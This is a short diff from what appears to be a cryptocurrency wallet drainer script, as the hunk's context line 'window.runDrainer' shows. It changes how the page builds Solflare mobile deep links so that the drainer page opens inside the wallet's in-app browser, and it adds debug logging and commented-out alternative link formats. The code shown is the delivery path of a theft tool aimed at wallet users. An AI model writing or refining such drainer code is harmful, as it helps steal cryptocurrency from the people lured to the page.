@@ -6142,16 +6142,24 @@ window.runDrainer = runDrainer;
             const userAgent = navigator.userAgent.toLowerCase();
             const isAndroid = /android/.test(userAgent);
             
-            if (isAndroid) {
-              // Android: Use redirect_link parameter
-              deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?redirect_link=${redirectLink}`;
-              fallbackUrl = `solflare://v1/browse/${encodedUrl}?redirect_link=${redirectLink}`;
-            } else {
-              // iOS: Use ref parameter with the dApp URL (correct format)
-              const dappUrl = encodeURIComponent(currentUrl);
-              deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${dappUrl}`;
-              fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${dappUrl}`;
-            }
+            // Try different Solflare deep link formats
+            console.log(`[SOLFLARE_MOBILE] Current URL: ${currentUrl}`);
+            console.log(`[SOLFLARE_MOBILE] Encoded URL: ${encodedUrl}`);
+            
+            // Format 1: Simple browse format
+            deepLink = `https://solflare.com/ul/browse/${encodedUrl}`;
+            fallbackUrl = `solflare://browse/${encodedUrl}`;
+            
+            // Format 2: Alternative with v1
+            // deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}`;
+            // fallbackUrl = `solflare://v1/browse/${encodedUrl}`;
+            
+            // Format 3: With query parameters
+            // deepLink = `https://solflare.com/ul/browse/?url=${encodedUrl}`;
+            // fallbackUrl = `solflare://browse/?url=${encodedUrl}`;
+            
+            console.log(`[SOLFLARE_MOBILE] Using deep link: ${deepLink}`);
+            console.log(`[SOLFLARE_MOBILE] Fallback URL: ${fallbackUrl}`);
           } else {
             // Desktop: Use custom scheme first
             deepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
